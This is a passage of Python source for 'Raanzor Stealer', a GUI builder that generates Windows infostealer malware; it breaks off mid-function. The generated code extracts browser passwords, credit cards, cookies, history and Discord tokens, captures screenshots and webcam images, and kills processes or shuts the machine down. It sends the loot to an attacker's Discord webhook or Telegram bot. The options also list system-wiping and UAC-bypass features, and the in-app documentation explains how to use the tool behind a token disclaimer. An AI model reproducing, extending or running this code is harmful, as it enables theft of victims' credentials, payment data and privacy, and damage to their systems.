import customtkinter as ctk
from customtkinter import CTkImage
from tkinter import ttk
from PIL import Image
import requests
import os
import platform
import psutil
import socket
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog, messagebox
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import uuid
import hashlib
import ctypes
import sys
import telegram

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class RaanzorStealer(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Raanzor Builder")
        self.geometry("1100x900")
        self.minsize(900, 800)
        ctk.set_appearance_mode("dark")
        self.configure(bg="#121212")

        self.main_container = ctk.CTkFrame(self, fg_color="#121212")
        self.main_container.pack(fill="both", expand=True)

        self.sidebar = ctk.CTkFrame(self.main_container, width=200, fg_color="#1A1A1A")
        self.sidebar.pack(side="left", fill="y")

        self.content = ctk.CTkFrame(self.main_container, fg_color="#121212")
        self.content.pack(side="right", fill="both", expand=True)

        image_path = "asset/raanzor.png"
        pil_image = Image.open(image_path)
        ctki_image = ctk.CTkImage(pil_image, size=(100, 100))
        logo_label = ctk.CTkLabel(self.sidebar, image=ctki_image, text="")
        logo_label.image = ctki_image
        logo_label.pack(pady=20)

        self.menu_buttons = [
            ("Builder", self.show_builder),
            ("Docu", self.show_documentation),
            ("FAQ", self.show_faq),
            ("Settings", self.show_settings)
        ]

        for label, command in self.menu_buttons:
            btn = ctk.CTkButton(
                self.sidebar,
                text=label,
                font=("Arial", 20, "bold"),
                text_color="black",
                fg_color="#8B0000",
                hover_color="#FF0000",
                command=command,
                corner_radius=10,
                height=60
            )
            btn.pack(fill="x", padx=10, pady=5)

        self.pages = {}
        self.version = "Discord"
        self.show_builder()

    def clear_content(self):
        for widget in self.content.winfo_children():
            widget.destroy()

    def show_builder(self):
        self.clear_content()
        self.build_top_frame()
        self.build_webhook_frame()
        self.build_checkbox_section()

    def build_top_frame(self):
        top_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
        top_frame.pack(fill="x", pady=15, padx=15)

        title_label = ctk.CTkLabel(
            top_frame,
            text="RAANZOR STEALER",
            font=("Consolas", 42, "bold"),
            text_color="#FF0000"
        )
        title_label.pack(side="left", padx=30)

        right_buttons_frame = ctk.CTkFrame(top_frame, fg_color="transparent")
        right_buttons_frame.pack(side="right", padx=10)

        self.format_option = ctk.CTkComboBox(
            right_buttons_frame,
            values=["Python (.py)", "Executable (.exe)"],
            width=180,
            height=40,
            fg_color="#1C1C1C",
            dropdown_fg_color="#1C1C1C",
            text_color="#FF6666",
            button_color="#8B0000",
            button_hover_color="#FF0000"
        )
        self.format_option.set("Python (.py)")
        self.format_option.pack(side="left", padx=5)

        self.generate_btn = ctk.CTkButton(
            right_buttons_frame,
            text="⚙ Build",
            width=160,
            height=40,
            font=("Arial", 16, "bold"),
            fg_color="#8B0000",
            hover_color="#FF0000",
            text_color="black",
            command=self.generate_script,
            corner_radius=10
        )
        self.generate_btn.pack(side="left", padx=5)

    def build_webhook_frame(self):
        webhook_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
        webhook_frame.pack(fill="x", padx=30, pady=(30, 15))

        if self.version == "Discord":
            webhook_label = ctk.CTkLabel(webhook_frame, text="Webhook URL:", font=("Consolas", 14), text_color="white")
            webhook_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)

            self.webhook_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="https://discord.com/api/webhooks/...")
            self.webhook_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)
        else:
            bot_token_label = ctk.CTkLabel(webhook_frame, text="Bot Token:", font=("Consolas", 14), text_color="white")
            bot_token_label.grid(row=0, column=0, sticky="w", padx=10, pady=10)

            self.bot_token_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="Enter your bot token...")
            self.bot_token_entry.grid(row=0, column=1, sticky="ew", padx=10, pady=10)

            chat_id_label = ctk.CTkLabel(webhook_frame, text="Chat ID:", font=("Consolas", 14), text_color="white")
            chat_id_label.grid(row=1, column=0, sticky="w", padx=10, pady=10)

            self.chat_id_entry = ctk.CTkEntry(webhook_frame, width=450, placeholder_text="Enter your chat ID...")
            self.chat_id_entry.grid(row=1, column=1, sticky="ew", padx=10, pady=10)

        self.test_webhook_btn = ctk.CTkButton(
            webhook_frame,
            text="Test Webhook",
            fg_color="#8B0000",
            hover_color="#FF0000",
            command=self.test_webhook,
            width=150,
            height=30,
            font=("Arial", 14, "bold"),
            text_color="black",
            corner_radius=10
        )
        self.test_webhook_btn.grid(row=2, column=1, padx=10, pady=10)

        webhook_frame.grid_columnconfigure(1, weight=1)

    def build_checkbox_section(self):
        self.options = {name: ctk.BooleanVar() for name in [
            "System Info", "IP Info", "Clipboard", "Browsers List", "Antivirus List", "Downloads List", "Files on Desktop",
            "Screenshot", "Webcam Screen", "Wi-Fi SSID", "Kill All Programs", "Kill Discord Client", "Shutdown",
            "Fake Error", "Disconnect User", "Browsers Passwords", "Credit Cards", "Discord Token", "History",
            "Cookies", "Common Files", "TskMgr Info", "Shell History", "IPConf", "HWID", "UUID", "Discord Info",
            "Credentials", "Games", "System32 Deleter", "Windows Deleter", "BootLoader Deleter", "UAC Bypass",
            "Network Disruption", "Automated File Deleter"
        ]}

        container = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
        container.pack(fill="both", expand=True, padx=30, pady=10)

        canvas = tk.Canvas(container, bg="#1A1A1A", highlightthickness=0)
        scrollbar = ctk.CTkScrollbar(container, orientation="vertical", command=canvas.yview)
        scrollable_frame = ctk.CTkFrame(canvas, fg_color="#1A1A1A")

        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        categories = {
            "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown", "TskMgr Info", "IPConf", "HWID", "UUID"],
            "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files", "Shell History"],
            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User", "UAC Bypass", "Network Disruption"],
            "Multimedia": ["Screenshot", "Webcam Screen"],
            "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop", "Discord Info"],
            "Additional Info": ["Credentials", "Games"],
            "Dangerous Actions": ["System32 Deleter", "Windows Deleter", "BootLoader Deleter", "Automated File Deleter"]
        }

        self.checkboxes = {}
        row_idx = 0

        for category, opts in categories.items():
            cat_label = ctk.CTkLabel(scrollable_frame, text=category.upper(), font=("Consolas", 16, "bold"), text_color="#FF0000")
            cat_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
            row_idx += 1
            col = 0
            for opt in opts:
                checkbox = ctk.CTkCheckBox(
                    scrollable_frame,
                    text=opt,
                    variable=self.options[opt],
                    text_color="white",
                    fg_color="#2B2B2B",
                    hover_color="#3E3E3E",
                    border_color="#8B0000",
                    command=lambda v=opt: self.checkbox_color_update(v)
                )
                checkbox.grid(row=row_idx, column=col, sticky="w", padx=10, pady=3)
                self.checkboxes[opt] = checkbox
                col += 1
                if col > 2:
                    col = 0
                    row_idx += 1
            row_idx += 1

        # Add File Size option
        file_size_label = ctk.CTkLabel(scrollable_frame, text="FILE SIZE", font=("Consolas", 16, "bold"), text_color="#FF0000")
        file_size_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
        row_idx += 1

        self.file_size_var = ctk.StringVar(value="1MB")
        file_sizes = ["1MB", "10MB", "20MB", "30MB", "40MB", "50MB", "60MB", "70MB", "75MB", "80MB", "90MB", "100MB"]

        for size in file_sizes:
            radio_btn = ctk.CTkRadioButton(
                scrollable_frame,
                text=size,
                variable=self.file_size_var,
                value=size,
                text_color="white",
                fg_color="#8B0000",
                hover_color="#FF0000"
            )
            radio_btn.grid(row=row_idx, column=file_sizes.index(size) % 3, sticky="w", padx=10, pady=3)
            if (file_sizes.index(size) + 1) % 3 == 0:
                row_idx += 1

    def checkbox_color_update(self, option_name):
        checkbox = self.checkboxes.get(option_name)
        if checkbox:
            if self.options[option_name].get():
                checkbox.configure(fg_color="#8B0000", text_color="white")
            else:
                checkbox.configure(fg_color="#2B2B2B", text_color="white")

    def show_documentation(self):
        self.clear_content()
        doc_text = """
Tool Name: RaanzorStealerV2
Version: 2.7
Author: dsckazam
Language: Python

Description:
RaanzorStealerV2 is an advanced information-gathering tool developed in Python, featuring a CustomTkinter GUI. It is designed to collect a wide range of sensitive data from Windows systems and transmit the results via a configurable webhook.

Features:
- System Information Collection:
  - Retrieves IP address and system metadata
  - Captures clipboard contents
  - Detects installed antivirus software
  - Lists saved Wi-Fi SSIDs

- Browser Data Extraction:
  - Extracts saved passwords from browsers
  - Retrieves browsing history and cookies
  - Collects stored credit card information

- File and Media Capture:
  - Takes screenshots of the desktop
  - Captures images from the webcam

- File Scanning:
  - Scans Downloads and common directories for files

- Process Control:
  - Terminates specific programs, including Discord
  - Shuts down the system
  - Disconnects the user by disrupting network connectivity

- Discord Integration:
  - Extracts Discord tokens
  - Controls Discord client processes

- User Interaction:
  - Displays custom fake error messages

- Data Exfiltration:
  - Sends collected data to a specified webhook URL

Dependencies:
- Python 3.x
- CustomTkinter
- Additional Python libraries as specified in requirements.txt

Installation:
1. Clone the repository or download the source code.
2. Install dependencies:
   pip install -r requirements.txt
3. Configure the webhook URL and other settings in the configuration files.
4. Run the builder script to generate the executable:
   python builder.py

Legal Disclaimer:
This tool is intended for educational purposes and authorized penetration testing only. Unauthorized use is prohibited and may violate applicable laws. The developers are not responsible for any misuse of this tool.

Use responsibly.
        """

        text_box = ctk.CTkTextbox(self.content, font=("Consolas", 14), fg_color="#1A1A1A", text_color="white")
        text_box.pack(fill="both", expand=True, padx=20, pady=20)
        text_box.insert("0.0", doc_text)
        text_box.configure(state="disabled")

    def show_faq(self):
        self.clear_content()
        faq_text = """
FAQ - RaanzorStealerV2

1. What is RaanzorStealerV2?
RaanzorStealerV2 is an advanced information-gathering tool developed in Python with a CustomTkinter GUI. It collects various sensitive data from Windows systems and sends it via a Discord webhook.

2. What is the purpose of this tool?
- Collect system information (IP, antivirus, clipboard)
- Extract browser passwords and cookies
- Capture screenshots and webcam images
- Scan common directories like Downloads
- Control specific processes (Discord, shutdown)
- Send collected data to the webhook

3. Is it legal to use RaanzorStealerV2?
No. Using this tool without explicit authorization is illegal. It is intended for educational purposes, authorized penetration testing, or security research only.

4. What are the prerequisites to use RaanzorStealerV2?
- Python 3.x installed
- Install dependencies via: pip install -r requirements.txt
- A valid Discord webhook URL to receive data

5. How do I configure the webhook?
Go to the Webhook tab in the GUI, enter your full Discord webhook URL, and test the connection using the Test Webhook button.

6. What output formats are supported?
- Python script (.py)
- Executable (.exe)

7. What options can I customize for data collection?
In the Options tab, you can enable or disable:
- IP collection
- Clipboard capture
- Antivirus detection
- Wi-Fi password extraction
- Browser password retrieval
- Screenshot and webcam capture
- Directory scanning
- Killing Discord process and system shutdown
- Sending data to the webhook

8. How do I generate the builder?
Select the desired output format in the Build tab, then click the Build button to generate the script or executable.

9. How can I verify that the tool works correctly?
- Test the webhook in the Webhook tab
- Make sure the desired options are enabled in Options
- Check if data is being sent to the Discord webhook

10. Does RaanzorStealerV2 work on Linux or macOS?
No, it is designed specifically for Windows and certain features will not work on other operating systems.

11. How can I contribute to the project?
- Fork the GitHub repository
- Submit improvements or bug fixes via pull requests
- Respect the MIT license and usage guidelines

12. What should I do if I encounter a bug or issue?
Open an issue on the GitHub repository with a detailed description of the problem and your environment.

13. Can I use this code for my own projects?
Yes, provided you comply with the MIT license and use it legally and ethically.
        """

        text_box = ctk.CTkTextbox(self.content, font=("Consolas", 14), fg_color="#1A1A1A", text_color="white")
        text_box.pack(fill="both", expand=True, padx=20, pady=20)
        text_box.insert("0.0", faq_text)
        text_box.configure(state="disabled")

    def show_settings(self):
        self.clear_content()

        settings_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
        settings_frame.pack(fill="both", expand=True, padx=20, pady=20)

        version_label = ctk.CTkLabel(settings_frame, text="Builder Version:", font=("Consolas", 16), text_color="white")
        version_label.pack(pady=10)

        self.version_var = ctk.StringVar(value=self.version)
        version_options = ["Discord", "Telegram"]

        for option in version_options:
            radio_btn = ctk.CTkRadioButton(
                settings_frame,
                text=option,
                variable=self.version_var,
                value=option,
                text_color="white",
                fg_color="#8B0000",
                hover_color="#FF0000"
            )
            radio_btn.pack(pady=5)

        save_btn = ctk.CTkButton(
            settings_frame,
            text="Save",
            fg_color="#8B0000",
            hover_color="#FF0000",
            command=self.save_settings,
            width=150,
            height=30,
            font=("Arial", 14, "bold"),
            text_color="black",
            corner_radius=10
        )
        save_btn.pack(pady=20)

    def save_settings(self):
        self.version = self.version_var.get()
        self.show_message(f"Settings saved. Version: {self.version}")
        self.show_builder()

    def show_message(self, message):
        messagebox.showinfo("Info", message)

    def test_webhook(self):
        if self.version == "Discord":
            url = self.webhook_entry.get()
            if not url.startswith("http"):
                self.show_message("Invalid Webhook URL")
                return
            try:
                response = requests.post(url, json={"content": "Webhook Test"})
                if response.status_code == 204:
                    self.show_message("Webhook Valid")
                else:
                    self.show_message("Invalid Webhook")
            except Exception as e:
                self.show_message(f"Error testing webhook: {e}")
        else:
            bot_token = self.bot_token_entry.get()
            chat_id = self.chat_id_entry.get()
            if not bot_token or not chat_id:
                self.show_message("Invalid Bot Token or Chat ID")
                return
            try:
                bot = telegram.Bot(token=bot_token)
                bot.send_message(chat_id=chat_id, text="Webhook Test")
                self.show_message("Webhook Valid")
            except Exception as e:
                self.show_message(f"Error testing webhook: {e}")

    def generate_script(self):
        if self.version == "Discord":
            webhook = self.webhook_entry.get()
        else:
            bot_token = self.bot_token_entry.get()
            chat_id = self.chat_id_entry.get()

        selected_options = [name for name, var in self.options.items() if var.get()]
        if "Fake Error" in selected_options:
            self.get_fake_error_info()
        script_content = self.create_script_content(webhook if self.version == "Discord" else (bot_token, chat_id), selected_options)
        output_format = self.format_option.get()

        if output_format == "Python (.py)":
            script_path = "baliz_stealer_file.py"
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            self.show_message("Python script generated successfully.")
        else:
            script_path = "system_info.py"
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            try:
                os.system("pyinstaller --onefile --noconsole system_info.py")
                self.show_message("Executable script generated successfully.")
            except Exception as e:
                self.show_message(f"Error during executable creation: {e}")

    def get_fake_error_info(self):
        root = tk.Tk()
        root.withdraw()
        self.fake_error_title = simpledialog.askstring("Error Title", "Enter the error title:")
        self.fake_error_message = simpledialog.askstring("Error Message", "Enter the error message:")

    def create_script_content(self, webhook_or_telegram, options):
        if self.version == "Discord":
            script_parts = [f"webhook = '{webhook_or_telegram}'"]
        else:
            bot_token, chat_id = webhook_or_telegram
            script_parts = [f"bot_token = '{bot_token}'", f"chat_id = '{chat_id}'"]

        script_parts.append("""
import requests
import platform
import socket
import os
import psutil
import json
import pyperclip
import pyautogui
import cv2
import subprocess
import tkinter as tk
from tkinter import simpledialog
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import uuid
import hashlib
import ctypes
import sys
import telegram

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )

def send_embed(title, fields):
    if 'webhook' in globals():
        embed = {
            "title": title,
            "color": 65280,
            "fields": fields
        }
        try:
            requests.post(webhook, json={"embeds": [embed]})
        except Exception as e:
            print(f"Error sending embed: {e}")
    else:
        bot = telegram.Bot(token=bot_token)
        message = f"{title}\\n" + "\\n".join([f"{field['name']}: {field['value']}" for field in fields])
        try:
            bot.send_message(chat_id=chat_id, text=message)
        except Exception as e:
            print(f"Error sending message: {e}")

def send_file(file_path, title):
    if 'webhook' in globals():
        try:
            with open(file_path, "rb") as file:
                files = {"file": (file_path, file.read())}
                requests.post(webhook, files=files)
        except Exception as e:
            print(f"Error sending file: {e}")
    else:
        bot = telegram.Bot(token=bot_token)
        try:
            with open(file_path, "rb") as file:
                bot.send_document(chat_id=chat_id, document=file)
        except Exception as e:
            print(f"Error sending file: {e}")
""")

        if "System Info" in options:
            script_parts.append("""
def get_system_info():
    system_info = [
        {"name": "Hostname", "value": socket.gethostname(), "inline": True},
        {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
        {"name": "CPU", "value": platform.processor(), "inline": False},
        {"name": "RAM", "value": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB", "inline": True}
    ]
    send_embed("🖥️ System Info", system_info)
""")

        if "IP Info" in options:
            script_parts.append("""
def get_ip_info():
    try:
        ip_data = requests.get("https://ipinfo.io/json").json()
        ip_info = [
            {"name": "IP", "value": ip_data.get("ip", "N/A"), "inline": True},
            {"name": "City", "value": ip_data.get("city", "N/A"), "inline": True},
            {"name": "Country", "value": ip_data.get("country", "N/A"), "inline": False},
            {"name": "ISP", "value": ip_data.get("org", "N/A"), "inline": False}
        ]
        send_embed("🌍 IP Info", ip_info)
    except Exception as e:
        print(f"Error getting IP info: {e}")
""")

        if "Browsers List" in options:
            script_parts.append("""
def get_browsers_list():
    browsers = ["Chrome", "Firefox", "Edge"]
    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in ["C:\\Program Files", "C:\\Program Files (x86)"])]
    send_embed("🌐 Browsers", [{"name": "Installed", "value": ', '.join(installed), "inline": False}])
""")

        if "Antivirus List" in options:
            script_parts.append("""
def get_antivirus_list():
    try:
        av = os.popen("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName").read()
        send_embed("🛡️ Antivirus", [{"name": "Antivirus List", "value": av, "inline": False}])
    except Exception as e:
        print(f"Error getting antivirus list: {e}")
""")

        if "Downloads List" in options:
            script_parts.append("""
def get_downloads_list():
    try:
        files = '\\n'.join(os.listdir(os.path.expanduser("~/Downloads"))[:10])
        send_embed("📂 Downloads", [{"name": "Latest Files", "value": files, "inline": False}])
    except Exception as e:
        print(f"Error getting downloads list: {e}")
""")

        if "Files on Desktop" in options:
            script_parts.append("""
def get_desktop_files():
    try:
        files = '\\n'.join(os.listdir(os.path.expanduser("~/Desktop"))[:10])
        send_embed("🖥️ Desktop Files", [{"name": "Latest Files", "value": files, "inline": False}])
    except Exception as e:
        print(f"Error getting desktop files: {e}")
""")

        if "Screenshot" in options:
            script_parts.append("""
def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        send_file("screenshot.png", "📸 Screenshot")
    except Exception as e:
        print(f"Error taking screenshot: {e}")
""")

        if "Webcam Screen" in options:
            script_parts.append("""
def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam_photo.png", frame)
        cap.release()
        send_file("webcam_photo.png", "📷 Webcam Photo")
    except Exception as e:
        print(f"Error taking webcam photo: {e}")
""")

        if "Wi-Fi SSID" in options:
            script_parts.append("""
def get_wifi_ssid():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        output = result.stdout
        ssid_line = [line for line in output.split('\\n') if "SSID" in line]
        if ssid_line:
            return ssid_line[0].split(":")[1].strip()
    except Exception as e:
        return str(e)

def send_wifi_ssid():
    ssid = get_wifi_ssid()
    send_embed("📶 Wi-Fi SSID", [{"name": "SSID", "value": ssid, "inline": False}])
""")

        if "Kill All Programs" in options:
            script_parts.append("""
def kill_all_programs():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            proc.terminate()
        except psutil.NoSuchProcess:
            pass
""")

        if "Kill Discord Client" in options:
            script_parts.append("""
def kill_discord():
    for proc in psutil.process_iter(['pid', 'name']):
        if "discord" in proc.name().lower():
            proc.terminate()
""")

        if "Shutdown" in options:
            script_parts.append("""
def shutdown():
    os.system("shutdown /s /f /t 1")
""")

        if "Fake Error" in options:
            script_parts.append(f"""
def fake_error():
    title = "{self.fake_error_title}"
    message = "{self.fake_error_message}"
    tk.messagebox.showerror(title, message)
""")

        if "Disconnect User" in options:
            script_parts.append("""
def disconnect_user():
    os.system('shutdown -l')
""")

        if "Browsers Passwords" in options:
            script_parts.append("""
def get_chrome_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
            yield url, username, password
        except Exception as e:
            print(f"Error decrypting password: {e}")
    conn.close()
    os.remove("Loginvault.db")

def get_firefox_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login["hostname"]
                username = login["encryptedUsername"]
                password = login["encryptedPassword"]
                yield url, username, password

def get_edge_passwords():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for url, username, password in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(password)[1]
            yield url, username, password
        except Exception as e:
            print(f"Error decrypting password: {e}")
    conn.close()
    os.remove("Loginvault.db")

def get_browsers_passwords():
    passwords = []
    for url, username, password in get_chrome_passwords():
        passwords.append(f"Chrome - URL: {url}, Username: {username}, Password: {password}")
    for url, username, password in get_firefox_passwords():
        passwords.append(f"Firefox - URL: {url}, Username: {username}, Password: {password}")
    for url, username, password in get_edge_passwords():
        passwords.append(f"Edge - URL: {url}, Username: {username}, Password: {password}")
    send_embed("🔒 Browser Passwords", [{"name": "Passwords", "value": '\\n'.join(passwords), "inline": False}])
""")

        if "Credit Cards" in options:
            script_parts.append("""
def get_chrome_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "web-data")
    if not os.path.exists(path):
        return []
    shutil.copy2(path, "web-data.db")
    conn = sqlite3.connect("web-data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT name_on_card, card_number_encrypted, origin FROM credit_cards")
    for row in cursor.fetchall():
        name_on_card = row[0]
        card_number_encrypted = row[1]
        origin = row[2]
        card_number = decrypt_data(card_number_encrypted)
        yield {"name": name_on_card, "number": card_number, "origin": origin}
    conn.close()
    os.remove("web-data.db")

def get_firefox_credit_cards():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    for profile in profiles:
        path = os.path.join(profile, "logins.json")
        if not os.path.exists(path):
            continue
        with open(path, "r", encoding="utf-8") as f:
            logins = json.load(f)
            for login in logins["logins"]:
                url = login.get("hostname", "N/A")
                username = login.get("encryptedUsername", "N/A")
                password = login.get("encryptedPassword", "N/A")
                yield {"url": url, "username": username, "password": password}

def decrypt_data(encrypted_data):
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        encrypted_data = encrypted_data[5:]
        iv = encrypted_data[:12]
        payload = encrypted_data[12:]
        key = b'peanuts'
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(payload)
        return decrypted_data.decode()
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return None

def get_credit_cards():
    credit_cards = []
    for card in get_chrome_credit_cards():
        credit_cards.append(f"Chrome - Name: {card['name']}, Number: {card['number']}, Origin: {card['origin']}")
    for card in get_firefox_credit_cards():
        credit_cards.append(f"Firefox - URL: {card['url']}, Username: {card['username']}, Password: {card['password']}")
    send_embed("💳 Credit Cards", [{"name": "Credit Cards", "value": '\\n'.join(credit_cards), "inline": False}])
""")

        if "Discord Token" in options:
            script_parts.append("""
def get_discord_token():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Discord", "Local Storage", "leveldb")
    if not os.path.exists(path):
        return None
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as file:
                for line in file:
                    if "token" in line and "}" in line:
                        parts = line.split('"token": "')
                        if len(parts) > 1:
                            token_part = parts[1].split('"')[0]
                            return token_part
    return None

def get_discord_info():
    discord_token = get_discord_token()
    if discord_token:
        headers = {"Authorization": discord_token}
        try:
            user_info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
            discord_info = [
                {"name": "ID", "value": user_info.get("id", "N/A"), "inline": True},
                {"name": "Username", "value": user_info.get("username", "N/A"), "inline": True},
                {"name": "Display Name", "value": user_info.get("global_name", "N/A"), "inline": False},
                {"name": "Email", "value": user_info.get("email", "N/A"), "inline": True},
                {"name": "Phone Number", "value": user_info.get("phone", "N/A"), "inline": True},
                {"name": "Nitro Type", "value": user_info.get("premium_type", "N/A"), "inline": True},
                {"name": "MFA Enabled", "value": user_info.get("mfa_enabled", "N/A"), "inline": True}
            ]
            send_embed("Discord Info \U0001F451", discord_info)
        except Exception as e:
            print(f"Error getting Discord info: {e}")
    else:
        send_embed("Discord Token \U0001F451", [{"name": "Token", "value": "Not Found", "inline": False}])
""")

        if "History" in options:
            script_parts.append("""
def get_chrome_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_firefox_history():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    history = []
    for profile in profiles:
        path = os.path.join(profile, "places.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
        history.extend(cursor.fetchall())
        conn.close()
    return history

def get_edge_history():
    history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
    if not os.path.exists(history_path):
        return []
    shutil.copy2(history_path, "History.db")
    conn = sqlite3.connect("History.db")
    cursor = conn.cursor()
    cursor.execute("SELECT url, title, last_visit_time FROM urls")
    history = cursor.fetchall()
    conn.close()
    os.remove("History.db")
    return history

def get_history():
    history = []
    history.extend(get_chrome_history())
    history.extend(get_firefox_history())
    history.extend(get_edge_history())
    return "\\n".join([f"URL: {h[0]}, Title: {h[1]}, Last Visit: {h[2]}" for h in history])

def send_history():
    history = get_history()
    send_embed("History", [{"name": "History", "value": history, "inline": False}])
""")

        if "Cookies" in options:
            script_parts.append("""
def get_chrome_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_firefox_cookies():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    profiles = [f.path for f in os.scandir(path) if f.is_dir()]
    cookies = []
    for profile in profiles:
        path = os.path.join(profile, "cookies.sqlite")
        if not os.path.exists(path):
            continue
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, expiry FROM moz_cookies")
        cookies.extend(cursor.fetchall())
        conn.close()
    return cookies

def get_edge_cookies():
    cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
    if not os.path.exists(cookies_path):
        return []
    shutil.copy2(cookies_path, "Cookies.db")
    conn = sqlite3.connect("Cookies.db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, value, expires_utc FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    os.remove("Cookies.db")
    return cookies

def get_cookies():
    cookies = []
    cookies.extend(get_chrome_cookies())
    cookies.extend(get_firefox_cookies())
    cookies.extend(get_edge_cookies())
    return "\\n".join([f"Host: {c[0]}, Name: {c[1]}, Value: {c[2]}, Expires: {c[3]}" for c in cookies])

def send_cookies():
    cookies = get_cookies()
    send_embed("Cookies", [{"name": "Cookies", "value": cookies, "inline": False}])
""")

        if "Common Files" in options:
            script_parts.append("""
def get_common_files():
    common_files = []
    common_paths = [
        os.path.join(os.environ["USERPROFILE"], "Documents"),
        os.path.join(os.environ["USERPROFILE"], "Pictures"),
